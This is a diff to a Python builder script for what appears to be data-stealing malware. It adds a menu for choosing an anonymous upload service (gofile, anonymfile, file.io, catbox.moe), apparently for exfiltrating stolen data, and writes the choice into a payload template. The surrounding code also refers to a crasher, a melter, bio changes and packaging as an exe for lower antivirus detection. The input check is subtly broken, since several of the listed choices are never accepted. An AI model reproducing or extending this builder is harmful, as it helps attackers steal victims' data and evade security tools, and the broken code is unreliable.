@@ -152,7 +152,38 @@ while True:
 
     if melter:
         crasher = False
-
+        
+    while True:
+        service = input('Which upload services you want to use? (Choose between gofileio, anonymfilecom, fileio, catboxmoe) (you can choose with 1,2,3,4 too) :')
+        
+        if service.lower() in ['gofile', 'anonymousfile', 'fileio','1','2','3']:
+            if service.lower() == 'gofile' or service.lower() == '1':
+                gofile = True
+                anonymousfile = False
+                fileio = False
+                catbox = False
+                break
+            elif service.lower() == 'anonymfilecom' or service.lower() == '2':
+                anonymousfile = True
+                fileio = False
+                gofile = False
+                catbox = False
+                break
+            elif service.lower() == 'fileio' or service.lower() == '3':
+                fileio = True
+                anonymousfile = False
+                gofile = False
+                catbox = False
+                break
+            elif service.lower() == 'catboxmoe' or service.lower() == '4':
+                catbox = True
+                fileio = False
+                anonymousfile = False
+                gofile = False
+                break
+            else:
+                print('WRONG INPUT! ')
+            
     def generate_key(length):
         key = list(range(256))
         random.shuffle(key)
@@ -181,6 +212,10 @@ while True:
     new_content = new_content.replace("'%Crash%'", str(crasher))
     new_content = new_content.replace("'%Hide%'", str(hide))
     new_content = new_content.replace("'%ChangeBio%'", str(change))
+    new_content = new_content.replace("'%AnonymousYesOrNo%'", str(anonymousfile))
+    new_content = new_content.replace("'%GoFileYesOrNo%'", str(gofile))
+    new_content = new_content.replace("'%FileIOYesOrNo%'", str(fileio))
+    new_content = new_content.replace("'%CatBoxMoeYesOrNo%'", str(catbox))
     if change:
         new_content = new_content.replace("'%Text%'", str(f"'''{bio}'''"))
 
@@ -228,7 +263,7 @@ while True:
     while True:
         if Exe in ['y', 'yes']:
             
-            ask = input('Do you want to make it exe with pyinstaller or with IExpress? (Yes if pyinstaller (More detection) / (No if IExpress (Less detection)')
+            ask = input('Do you want to make it exe with pyinstaller or with IExpress? (Yes if pyinstaller) (No if IExpress)')
             if ask in ["yes","y"]:
                 from sys import executable
                 icon_path = input('Enter the path to the icon file (leave blank for no icon): ')
